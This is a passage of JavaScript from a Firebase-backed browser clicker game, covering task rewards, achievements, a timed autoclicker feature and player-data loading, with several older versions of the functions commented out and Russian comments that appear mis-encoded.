        } else if (task.id === "autoclickerMaster") {
          showMessage(`Task "${task.description}" completed! ${task.reward}`);
          //startAutoclicker(300000); // –ó–∞–ø—É—Å–∫–∞–µ–º –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä –Ω–∞ 5 –º–∏–Ω—É—Ç
          startAutoclicker(300000, true); // –ó–∞–ø—É—Å–∫–∞–µ–º –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä –Ω–∞ 5 –º–∏–Ω—É—Ç —Å —Å—É–º–º–∏—Ä–æ–≤–∞–Ω–∏–µ–º
          submitScore();
        } else if (task.id === "thriftyPlayer") {
          score += task.reward;
          showMessage(`Task "${task.description}" completed! +${task.reward} tokens`);
          updateCounterDisplay();
          submitScore();
          if (thriftyPlayerTimer) {
            clearInterval(thriftyPlayerTimer);
            thriftyPlayerTimer = null;
          }
        }
        db.ref(`tasks/${user.uid}/${taskId}`).set({
          progress: 0,
          lastReset: taskData.lastReset,
          completions: completions,
          completed: true
        });
      }
      renderTasks();
    }
  });
}
    

    function clickToken() {
      score += clickPower;
      totalClicks++;
      updateTaskProgress("clickMarathon", 1);
      updateTaskProgress("levelUp", clickPower);
      checkAchievements();
      updateCounterDisplay();
      updateProfilePanel();
      animateCounter();
    }

    function animateCounter() {
      const counter = document.getElementById('counter');
      counter.classList.add('bounce');
      setTimeout(() => {
        counter.classList.remove('bounce');
      }, 200);
    }

    function checkAchievements() {
      if (!achievements.superClicker && totalClicks >= 10000) {
        achievements.superClicker = true;
        boostClickPowerTemporarily(2, 120000);
        showMessage("Secret Achievement Unlocked: Super Clicker! Click Power +2 for 2 minutes!");
        updateClickPowerBar();
        renderAchievements();
        saveAchievements();
      }

      if (!achievements.tokenHoarder && score >= 1000000) {
        achievements.tokenHoarder = true;
        boostClickPowerTemporarily(2, 120000);
        showMessage("Secret Achievement Unlocked: Token Hoarder! Click Power +2 for 2 minutes!");
        updateClickPowerBar();
        renderAchievements();
        saveAchievements();
      }

      const currentLevel = parseInt(document.getElementById("playerLevel").innerText);
      if (!achievements.level5 && currentLevel >= 5) {
        achievements.level5 = true;
        boostClickPowerTemporarily(2, 120000);
        showMessage("Secret Achievement Unlocked: Level 5 Reached! Click Power +2 for 2 minutes!");
        updateClickPowerBar();
        renderAchievements();
        saveAchievements();
      }
    }

    function saveAchievements() {
      if (!user) return;
      db.ref("achievements/" + user.uid).set(achievements);
    }

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏—è –≤–∏–¥–∏–º–æ—Å—Ç–∏ –º–∞–≥–∞–∑–∏–Ω–∞ (Shop)
function toggleShop() {
  const shop = document.getElementById("shop");
  const btn = document.getElementById("shopBtn");
  const isCurrentlyOpen = shop.style.display === "block"; // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –æ—Ç–∫—Ä—ã—Ç–∞ –ª–∏ –ø–∞–Ω–µ–ª—å —Å–µ–π—á–∞—Å

  // –°–Ω–∞—á–∞–ª–∞ –∑–∞–∫—Ä—ã–≤–∞–µ–º –≤—Å–µ –ø–∞–Ω–µ–ª–∏
  closeAllPanels();

  // –ü–µ—Ä–µ–∫–ª—é—á–∞–µ–º –≤–∏–¥–∏–º–æ—Å—Ç—å –º–∞–≥–∞–∑–∏–Ω–∞ –∏ –æ–±–Ω–æ–≤–ª—è–µ–º —Ç–µ–∫—Å—Ç –∫–Ω–æ–ø–∫–∏
  shop.style.display = isCurrentlyOpen ? "none" : "block";
  btn.innerHTML = isCurrentlyOpen ? "Shop ‚ñº" : "Shop ‚ñ≤";
}
    
    /*!function startAutoclicker(duration) {
      if (autoclickActive) {
        stopAutoclicker();
      }

      autoclickActive = true;
      autoclickEndTime = Date.now() + duration;
      autoclickInterval = setInterval(() => clickToken(), 1000);
      autoclickerUses++;
      checkAchievements();

      updateProfilePanel();
      submitScore();

      if (user) {
        db.ref("leaderboard/" + user.uid).update({
          autoclickActive: true,
          autoclickEndTime: autoclickEndTime,
          lastUpdate: Date.now()
        }).catch(error => {
          console.error("Error saving autoclicker state:", error);
        });
      }

      setTimeout(() => stopAutoclicker(), duration);
    }!*/


  /*?!?  function startAutoclicker(duration) {
  if (autoclickActive) {
    // –ï—Å–ª–∏ –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä —É–∂–µ –∞–∫—Ç–∏–≤–µ–Ω, –¥–æ–±–∞–≤–ª—è–µ–º –Ω–æ–≤—É—é –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –∫ –æ—Å—Ç–∞–≤—à–µ–º—É—Å—è –≤—Ä–µ–º–µ–Ω–∏
    const remainingTime = Math.max(0, autoclickEndTime - Date.now());
    autoclickEndTime = Date.now() + remainingTime + duration;
    clearInterval(autoclickInterval); // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Å—Ç–∞—Ä—ã–π –∏–Ω—Ç–µ—Ä–≤–∞–ª
  } else {
    // –ï—Å–ª–∏ –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä –Ω–µ –∞–∫—Ç–∏–≤–µ–Ω, —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –Ω–æ–≤–æ–µ –≤—Ä–µ–º—è
    autoclickActive = true;
    autoclickEndTime = Date.now() + duration;
  }

  // –ó–∞–ø—É—Å–∫–∞–µ–º –Ω–æ–≤—ã–π –∏–Ω—Ç–µ—Ä–≤–∞–ª
  autoclickInterval = setInterval(() => clickToken(), 1000);
  autoclickerUses++;
  checkAchievements();

  updateProfilePanel();
  submitScore();

  if (user) {
    db.ref("leaderboard/" + user.uid).update({
      autoclickActive: true,
      autoclickEndTime: autoclickEndTime,
      lastUpdate: Date.now()
    }).catch(error => {
      console.error("Error saving autoclicker state:", error);
    });
  }

  // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ç–∞–π–º–µ—Ä –¥–ª—è –æ—Å—Ç–∞–Ω–æ–≤–∫–∏ –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä–∞
  setTimeout(() => stopAutoclicker(), autoclickEndTime - Date.now());
}?!?*/

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–ø—É—Å–∫–∞ –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä–∞ —Å –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å—é —Å—É–º–º–∏—Ä–æ–≤–∞–Ω–∏—è –≤—Ä–µ–º–µ–Ω–∏
function startAutoclicker(duration, stack = false) {
  // –ï—Å–ª–∏ –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä —É–∂–µ –∞–∫—Ç–∏–≤–µ–Ω –∏ —Å—É–º–º–∏—Ä–æ–≤–∞–Ω–∏–µ –Ω–µ —Ç—Ä–µ–±—É–µ—Ç—Å—è, –æ—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ç–µ–∫—É—â–∏–π
  if (autoclickActive && !stack) {
    stopAutoclicker();
  }

  autoclickActive = true;
  // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –Ω–æ–≤–æ–µ –≤—Ä–µ–º—è –æ–∫–æ–Ω—á–∞–Ω–∏—è –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä–∞
  autoclickEndTime = Date.now() + duration;
  // –ó–∞–ø—É—Å–∫–∞–µ–º –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä: –∫–∞–∂–¥—É—é —Å–µ–∫—É–Ω–¥—É –¥–æ–±–∞–≤–ª—è–µ–º —Ç–æ–∫–µ–Ω—ã
  autoclickInterval = setInterval(() => clickToken(), 1000);
  autoclickerUses++; // –£–≤–µ–ª–∏—á–∏–≤–∞–µ–º —Å—á–µ—Ç—á–∏–∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–π –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä–∞
  checkAchievements(); // –ü—Ä–æ–≤–µ—Ä—è–µ–º –¥–æ—Å—Ç–∏–∂–µ–Ω–∏—è

  updateProfilePanel(); // –û–±–Ω–æ–≤–ª—è–µ–º –ø–∞–Ω–µ–ª—å –ø—Ä–æ—Ñ–∏–ª—è
  submitScore(); // –°–æ—Ö—Ä–∞–Ω—è–µ–º –ø—Ä–æ–≥—Ä–µ—Å—Å

  // –°–æ—Ö—Ä–∞–Ω—è–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä–∞ –≤ Firebase
  if (user) {
    db.ref("leaderboard/" + user.uid).update({
      autoclickActive: true,
      autoclickEndTime: autoclickEndTime,
      lastUpdate: Date.now()
    }).catch(error => {
      console.error("Error saving autoclicker state:", error);
    });
  }

  // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ç–∞–π–º–µ—Ä –¥–ª—è –æ—Å—Ç–∞–Ω–æ–≤–∫–∏ –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä–∞
  setTimeout(() => stopAutoclicker(), duration);
}


// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–ø—É—Å–∫–∞ –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä–∞ —Å –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å—é —Å—É–º–º–∏—Ä–æ–≤–∞–Ω–∏—è –≤—Ä–µ–º–µ–Ω–∏
/*????function startAutoclicker(duration, stack = false) {
  // –ï—Å–ª–∏ –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä —É–∂–µ –∞–∫—Ç–∏–≤–µ–Ω
  if (autoclickActive) {
    if (!stack) {
      // –ï—Å–ª–∏ —Å—É–º–º–∏—Ä–æ–≤–∞–Ω–∏–µ –Ω–µ —Ç—Ä–µ–±—É–µ—Ç—Å—è, –æ—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ç–µ–∫—É—â–∏–π –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä
      stopAutoclicker();
      autoclickEndTime = Date.now() + duration; // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –Ω–æ–≤–æ–µ –≤—Ä–µ–º—è –æ–∫–æ–Ω—á–∞–Ω–∏—è
    } else {
      // –ï—Å–ª–∏ —Å—É–º–º–∏—Ä–æ–≤–∞–Ω–∏–µ —Ç—Ä–µ–±—É–µ—Ç—Å—è, –¥–æ–±–∞–≤–ª—è–µ–º –Ω–æ–≤—É—é –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –∫ –æ—Å—Ç–∞–≤—à–µ–º—É—Å—è –≤—Ä–µ–º–µ–Ω–∏
      const remainingTime = Math.max(0, autoclickEndTime - Date.now());
      autoclickEndTime = Date.now() + remainingTime + duration;
      // –û—á–∏—â–∞–µ–º —Ç–µ–∫—É—â–∏–π –∏–Ω—Ç–µ—Ä–≤–∞–ª –∏ —Ç–∞–π–º–µ—Ä –æ—Å—Ç–∞–Ω–æ–≤–∫–∏
      clearInterval(autoclickInterval);
      clearTimeout(stopAutoclicker); // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –ø—Ä–µ–¥—ã–¥—É—â–∏–π —Ç–∞–π–º–µ—Ä –æ—Å—Ç–∞–Ω–æ–≤–∫–∏
    }
  } else {
    // –ï—Å–ª–∏ –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä –Ω–µ –∞–∫—Ç–∏–≤–µ–Ω, –ø—Ä–æ—Å—Ç–æ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –Ω–æ–≤–æ–µ –≤—Ä–µ–º—è
    autoclickActive = true;
    autoclickEndTime = Date.now() + duration;
  }

  // –ó–∞–ø—É—Å–∫–∞–µ–º –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä: –∫–∞–∂–¥—É—é —Å–µ–∫—É–Ω–¥—É –¥–æ–±–∞–≤–ª—è–µ–º —Ç–æ–∫–µ–Ω—ã
  autoclickInterval = setInterval(() => clickToken(), 1000);
  autoclickerUses++; // –£–≤–µ–ª–∏—á–∏–≤–∞–µ–º —Å—á–µ—Ç—á–∏–∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–π –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä–∞
  checkAchievements(); // –ü—Ä–æ–≤–µ—Ä—è–µ–º –¥–æ—Å—Ç–∏–∂–µ–Ω–∏—è

  updateProfilePanel(); // –û–±–Ω–æ–≤–ª—è–µ–º –ø–∞–Ω–µ–ª—å –ø—Ä–æ—Ñ–∏–ª—è
  submitScore(); // –°–æ—Ö—Ä–∞–Ω—è–µ–º –ø—Ä–æ–≥—Ä–µ—Å—Å

  // –°–æ—Ö—Ä–∞–Ω—è–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä–∞ –≤ Firebase
  if (user) {
    db.ref("leaderboard/" + user.uid).update({
      autoclickActive: true,
      autoclickEndTime: autoclickEndTime,
      lastUpdate: Date.now()
    }).catch(error => {
      console.error("Error saving autoclicker state:", error);
    });
  }

  // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ç–∞–π–º–µ—Ä –¥–ª—è –æ—Å—Ç–∞–Ω–æ–≤–∫–∏ –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä–∞ –Ω–∞ –æ—Å–Ω–æ–≤–µ –æ—Å—Ç–∞–≤—à–µ–≥–æ—Å—è –≤—Ä–µ–º–µ–Ω–∏
  const totalDuration = autoclickEndTime - Date.now();
  setTimeout(() => stopAutoclicker(), totalDuration);
}????*/


    
    
    

  /*!  function stopAutoclicker() {
      clearInterval(autoclickInterval);
      autoclickActive = false;
      autoclickEndTime = 0;
      autoclickInterval = null;

      updateProfilePanel();
      submitScore();
      showMessage("Autoclicker deactivated.");

      setTimeout(() => {
        autoclickCooldown = false;
        document.getElementById("autoclickBtn").disabled = false;
        showMessage("Autoclicker available again.");
      }, 1000);

      if (user) {
        db.ref("leaderboard/" + user.uid).update({
          autoclickActive: false,
          autoclickEndTime: 0,
          lastUpdate: Date.now()
        }).catch(error => {
          console.error("Error updating autoclicker state:", error);
        });
      }
    }!*/


    function stopAutoclicker() {
  clearInterval(autoclickInterval);
  autoclickActive = false;
  autoclickEndTime = 0;
  autoclickInterval = null;

  updateProfilePanel();
  submitScore();
  showMessage("Autoclicker deactivated.");

  autoclickCooldown = false; // –°–Ω–∏–º–∞–µ–º –∫—É–ª–¥–∞—É–Ω —Å—Ä–∞–∑—É –ø–æ—Å–ª–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è
  document.getElementById("autoclickBtn").disabled = false;
  showMessage("Autoclicker available again.");

  if (user) {
    db.ref("leaderboard/" + user.uid).update({
      autoclickActive: false,
      autoclickEndTime: 0,
      lastUpdate: Date.now()
    }).catch(error => {
      console.error("Error updating autoclicker state:", error);
    });
  }
    }

  

    
/*?!?function loadPlayerData(uid) {
  db.ref("leaderboard/" + uid).once("value").then(snapshot => {
    const data = snapshot.val();
    if (data) {
      score = data.score || 0;
      clickPower = data.clickPower || 1;
      autoclickActive = data.autoclickActive || false;
      autoclickEndTime = data.autoclickEndTime || 0;
      const lastUpdate = data.lastUpdate || 0;

      // –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–π –±—É—Å—Ç
      const tempBoostActive = data.tempBoostActive || false;
      const tempBoostEndTime = data.tempBoostEndTime || 0;
      const tempBoostOriginalClickPower = data.tempBoostOriginalClickPower || clickPower;
      const tempBoostAmount = data.tempBoostAmount || 0;

      if (tempBoostActive && tempBoostEndTime > Date.now()) {
        // –í–æ–∑–æ–±–Ω–æ–≤–ª—è–µ–º –±—É—Å—Ç
        clickPower = Math.min(tempBoostOriginalClickPower + tempBoostAmount, 8);
        const remainingDuration = tempBoostEndTime - Date.now();
        originalClickPower = tempBoostOriginalClickPower;
        boostClickPowerTemporarily(tempBoostAmount, remainingDuration);
      } else if (tempBoostActive) {
        // –ë—É—Å—Ç –∏—Å—Ç—ë–∫, –ø–æ–∫–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –±—ã–ª –æ—Ñ—Ñ–ª–∞–π–Ω
        clickPower = tempBoostOriginalClickPower;
        db.ref("leaderboard/" + uid).update({
          tempBoostActive: false,
          tempBoostEndTime: 0,
          tempBoostOriginalClickPower: 0,
          tempBoostAmount: 0,
          clickPower: clickPower,
          lastUpdate: Date.now()
        });
      }

      // –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä
      if (autoclickActive && autoclickEndTime > Date.now()) {
        const elapsedTime = Date.now() - lastUpdate;
        const secondsPassed = Math.floor(elapsedTime / 1000);
        const tokensEarned = secondsPassed * clickPower;
        if (tokensEarned > 0) {
          score += tokensEarned;
          showMessage(`Autoclicker earning ${tokensEarned}  tokens while you were away!`);
        }
        const remainingTime = autoclickEndTime - Date.now();
        startAutoclicker(remainingTime);
        document.getElementById("autoclickBtn").disabled = true;
      } else if (autoclickActive) {
        autoclickActive = false;
        autoclickEndTime = 0;
        db.ref("leaderboard/" + uid).update({
          autoclickActive: false,
          autoclickEndTime: 0
        });
        stopAutoclicker();
      }

      updateCounterDisplay();
      updateClickPowerBar();
      updateProfilePanel();
      renderAchievements();
      updateClickPowerCostText();
    }

    // –û–±–Ω–æ–≤–ª—è–µ–º lastUpdate
    if (user) {
      db.ref("leaderboard/" + uid).update({
        lastUpdate: Date.now()
      });
    }
// –ó–∞–ø—É—Å–∫–∞–µ–º —Ç–∞–π–º–µ—Ä –¥–ª—è –∑–∞–¥–∞—á–∏ "Thrifty Player"
    const today = new Date().toDateString();
    db.ref(`tasks/${uid}/thriftyPlayer`).once("value").then(snapshot => {
      const taskData = snapshot.val() || { progress: 0, lastReset: "", completions: 0, completed: false };
      if (taskData.lastReset !== today && !taskData.completed) {
        thriftyPlayerStartTime = Date.now();
        if (thriftyPlayerTimer) clearInterval(thriftyPlayerTimer);
        thriftyPlayerTimer = setInterval(() => {
          const elapsedSeconds = Math.floor((Date.now() - thriftyPlayerStartTime) / 1000);
          updateTaskProgress("thriftyPlayer", elapsedSeconds - taskData.progress);
        }, 1000);
      }
    });
    
    
  }).catch(error => {
    console.error("–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –¥–∞–Ω–Ω—ã—Ö –∏–≥—Ä–æ–∫–∞:", error);
    showMessage("–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å –¥–∞–Ω–Ω—ã–µ.");
  });

  db.ref("achievements/" + uid).once("value").then(snapshot => {
    const data = snapshot.val();
    if (data) {
      achievements = data;
      renderAchievements();
    }
  });
}?!?*/


 /*?!!!function loadPlayerData(uid) {
  db.ref("leaderboard/" + uid).once("value").then(snapshot => {
    const data = snapshot.val();
    if (data) {
      score = data.score || 0;
      clickPower = data.clickPower || 1;
      autoclickActive = data.autoclickActive || false;
      autoclickEndTime = data.autoclickEndTime || 0;
      const lastUpdate = data.lastUpdate || 0;

      // –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–π –±—É—Å—Ç —Å–∏–ª—ã –∫–ª–∏–∫–∞
      const tempBoostActive = data.tempBoostActive || false;
      const tempBoostEndTime = data.tempBoostEndTime || 0;
      const tempBoostOriginalClickPower = data.tempBoostOriginalClickPower || clickPower;
      const tempBoostAmount = data.tempBoostAmount || 0;

      if (tempBoostActive && tempBoostEndTime > Date.now()) {
        clickPower = Math.min(tempBoostOriginalClickPower + tempBoostAmount, 8);
        const remainingDuration = tempBoostEndTime - Date.now();
        originalClickPower = tempBoostOriginalClickPower;
        boostClickPowerTemporarily(tempBoostAmount, remainingDuration);
      } else if (tempBoostActive) {
        clickPower = tempBoostOriginalClickPower;
        db.ref("leaderboard/" + uid).update({
          tempBoostActive: false,
          tempBoostEndTime: 0,
          tempBoostOriginalClickPower: 0,
          tempBoostAmount: 0,
          clickPower: clickPower,
          lastUpdate: Date.now()
        });
      }

      // –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä
      if (autoclickActive && autoclickEndTime > Date.now()) {
        // –†–∞—Å—Å—á–∏—Ç—ã–≤–∞–µ–º, —Å–∫–æ–ª—å–∫–æ —Ç–æ–∫–µ–Ω–æ–≤ –∑–∞—Ä–∞–±–æ—Ç–∞–ª –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä, –ø–æ–∫–∞ –∏–≥—Ä–æ–∫ –±—ã–ª –æ—Ñ—Ñ–ª–∞–π–Ω
        const elapsedTime = Date.now() - lastUpdate;
        const secondsPassed = Math.floor(elapsedTime / 1000);
        const tokensEarned = secondsPassed * clickPower;
        if (tokensEarned > 0) {
          score += tokensEarned;
          showMessage(`Autoclicker earned ${tokensEarned} tokens while you were away!`);
        }
        const remainingTime = autoclickEndTime - Date.now(); // –û—Å—Ç–∞–≤—à–µ–µ—Å—è –≤—Ä–µ–º—è –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä–∞
        startAutoclicker(remainingTime, false); // –ó–∞–ø—É—Å–∫–∞–µ–º –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä –±–µ–∑ —Å—É–º–º–∏—Ä–æ–≤–∞–Ω–∏—è
        document.getElementById("autoclickBtn").disabled = true; // –û—Ç–∫–ª—é—á–∞–µ–º –∫–Ω–æ–ø–∫—É –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä–∞
      } else if (autoclickActive) {
        autoclickActive = false;
        autoclickEndTime = 0;
        db.ref("leaderboard/" + uid).update({
          autoclickActive: false,
          autoclickEndTime: 0
        });
        stopAutoclicker();
      }

      updateCounterDisplay(); // –û–±–Ω–æ–≤–ª—è–µ–º –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ —Ç–æ–∫–µ–Ω–æ–≤
      updateClickPowerBar(); // –û–±–Ω–æ–≤–ª—è–µ–º —à–∫–∞–ª—É —Å–∏–ª—ã –∫–ª–∏–∫–∞
      updateProfilePanel(); // –û–±–Ω–æ–≤–ª—è–µ–º –ø–∞–Ω–µ–ª—å –ø—Ä–æ—Ñ–∏–ª—è
      renderAchievements(); // –û–±–Ω–æ–≤–ª—è–µ–º –¥–æ—Å—Ç–∏–∂–µ–Ω–∏—è
      updateClickPowerCostText(); // –û–±–Ω–æ–≤–ª—è–µ–º —Å—Ç–æ–∏–º–æ—Å—Ç—å —É–ª—É—á—à–µ–Ω–∏—è —Å–∏–ª—ã –∫–ª–∏–∫–∞
    }

    // –û–±–Ω–æ–≤–ª—è–µ–º –≤—Ä–µ–º—è –ø–æ—Å–ª–µ–¥–Ω–µ–≥–æ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è
    if (user) {
      db.ref("leaderboard/" + uid).update({
        lastUpdate: Date.now()
      });
    }

    // –ó–∞–ø—É—Å–∫–∞–µ–º —Ç–∞–π–º–µ—Ä –¥–ª—è –∑–∞–¥–∞—á–∏ "Thrifty Player"
    const today = new Date().toDateString();
    db.ref(`tasks/${uid}/thriftyPlayer`).once("value").then(snapshot => {
      const taskData = snapshot.val() || { progress: 0, lastReset: "", completions: 0, completed: false };
      if (taskData.lastReset !== today && !taskData.completed) {
        thriftyPlayerStartTime = Date.now();
        if (thriftyPlayerTimer) clearInterval(thriftyPlayerTimer);
        thriftyPlayerTimer = setInterval(() => {
          const elapsedSeconds = Math.floor((Date.now() - thriftyPlayerStartTime) / 1000);
          updateTaskProgress("thriftyPlayer", elapsedSeconds - taskData.progress);
        }, 1000);
      }
    });
  }).catch(error => {
    console.error("–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –¥–∞–Ω–Ω—ã—Ö –∏–≥—Ä–æ–∫–∞:", error);
    showMessage("–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å –¥–∞–Ω–Ω—ã–µ.");
  });

  // –ó–∞–≥—Ä—É–∂–∞–µ–º –¥–æ—Å—Ç–∏–∂–µ–Ω–∏—è –∏–≥—Ä–æ–∫–∞
  db.ref("achievements/" + uid).once("value").then(snapshot => {
    const data = snapshot.val();
    if (data) {
      achievements = data;
      renderAchievements();
    }
  });
}   ?!*/


function loadPlayerData(uid) {
  db.ref("leaderboard/" + uid).once("value").then(snapshot => {
    const data = snapshot.val();
    if (data) {
      score = data.score || 0;
      clickPower = data.clickPower || 1;
      autoclickActive = data.autoclickActive || false;
      autoclickEndTime = data.autoclickEndTime || 0;
      const lastUpdate = data.lastUpdate || 0;

      // –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–π –±—É—Å—Ç
      const tempBoostActive = data.tempBoostActive || false;
      const tempBoostEndTime = data.tempBoostEndTime || 0;
      const tempBoostOriginalClickPower = data.tempBoostOriginalClickPower || clickPower;
      const tempBoostAmount = data.tempBoostAmount || 0;

      if (tempBoostActive && tempBoostEndTime > Date.now()) {
        // –í–æ–∑–æ–±–Ω–æ–≤–ª—è–µ–º –±—É—Å—Ç
        clickPower = Math.min(tempBoostOriginalClickPower + tempBoostAmount, 8);
        const remainingDuration = tempBoostEndTime - Date.now();
        originalClickPower = tempBoostOriginalClickPower;
        boostClickPowerTemporarily(tempBoostAmount, remainingDuration);
      } else if (tempBoostActive) {
        // –ë—É—Å—Ç –∏—Å—Ç—ë–∫
        clickPower = tempBoostOriginalClickPower;
        db.ref("leaderboard/" + uid).update({
          tempBoostActive: false,
          tempBoostEndTime: 0,
          tempBoostOriginalClickPower: 0,
          tempBoostAmount: 0,
          clickPower: clickPower,
          lastUpdate: Date.now()
        });
      }

      // –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä
      if (autoclickActive && autoclickEndTime > Date.now()) {
        const elapsedTime = Date.now() - lastUpdate;
        const secondsPassed = Math.floor(elapsedTime / 1000);
        const tokensEarned = secondsPassed * clickPower;
        if (tokensEarned > 0) {
          score += tokensEarned;
          showMessage(`Autoclicker earned ${tokensEarned} tokens while you were away!`);
        }
        const remainingTime = autoclickEndTime - Date.now();
        startAutoclicker(remainingTime);
        document.getElementById("autoclickBtn").disabled = true;
      } else if (autoclickActive) {
        autoclickActive = false;
        autoclickEndTime = 0;
        db.ref("leaderboard/" + uid).update({
          autoclickActive: false,
          autoclickEndTime: 0
        });
        stopAutoclicker();
      }

      updateCounterDisplay();
      updateClickPowerBar();
      updateProfilePanel();
      renderAchievements();
      updateClickPowerCostText();
    }

    // –û–±–Ω–æ–≤–ª—è–µ–º lastUpdate
    if (user) {
      db.ref("leaderboard/" + uid).update({
        lastUpdate: Date.now()
      });
    }

    // –ó–∞–ø—É—Å–∫–∞–µ–º —Ç–∞–π–º–µ—Ä –¥–ª—è –∑–∞–¥–∞—á–∏ "Thrifty Player"
    const today = new Date().toDateString();
    db.ref(`tasks/${uid}/thriftyPlayer`).once("value").then(snapshot => {
      const taskData = snapshot.val() || { progress: 0, lastReset: "", completions: 0, completed: false, startTime: 0 };
      if (taskData.lastReset !== today && !taskData.completed) {
        // –ï—Å–ª–∏ –∑–∞–¥–∞—á–∞ –Ω–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∞ –∏ –¥–µ–Ω—å –Ω–æ–≤—ã–π
        if (taskData.startTime && Date.now() - taskData.startTime < 300000) {
          // –í–æ–∑–æ–±–Ω–æ–≤–ª—è–µ–º —Ç–∞–π–º–µ—Ä —Å —É—á–µ—Ç–æ–º —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω–æ–≥–æ –≤—Ä–µ–º–µ–Ω–∏
          thriftyPlayerStartTime = taskData.startTime;
          const elapsedSeconds = Math.floor((Date.now() - thriftyPlayerStartTime) / 1000);
          updateTaskProgress("thriftyPlayer", elapsedSeconds - taskData.progress);
        } else {
          // –ù–∞—á–∏–Ω–∞–µ–º –∑–∞–¥–∞—á—É –∑–∞–Ω–æ–≤–æ
          thriftyPlayerStartTime = Date.now();
          db.ref(`tasks/${uid}/thriftyPlayer`).update({ startTime: thriftyPlayerStartTime, progress: 0 });
        }

        if (thriftyPlayerTimer) clearInterval(thriftyPlayerTimer);
        thriftyPlayerTimer = setInterval(() => {
          const elapsedSeconds = Math.floor((Date.now() - thriftyPlayerStartTime) / 1000);
          updateTaskProgress("thriftyPlayer", elapsedSeconds - taskData.progress);
          taskData.progress = elapsedSeconds;
          // –°–æ—Ö—Ä–∞–Ω—è–µ–º –ø—Ä–æ–≥—Ä–µ—Å—Å –∏ –≤—Ä–µ–º—è –Ω–∞—á–∞–ª–∞
          db.ref(`tasks/${uid}/thriftyPlayer`).update({
            progress: elapsedSeconds,
            startTime: thriftyPlayerStartTime
          });
        }, 1000);
      }
    });
  }).catch(error => {
    console.error("–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –¥–∞–Ω–Ω—ã—Ö –∏–≥—Ä–æ–∫–∞:", error);
    showMessage("–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å –¥–∞–Ω–Ω—ã–µ.");
  });

  db.ref("achievements/" + uid).once("value").then(snapshot => {
    const data = snapshot.val();
    if (data) {
      achievements = data;
      renderAchievements();
    }
  });
}
    

  

   function submitScore() {
  if (!user) return;
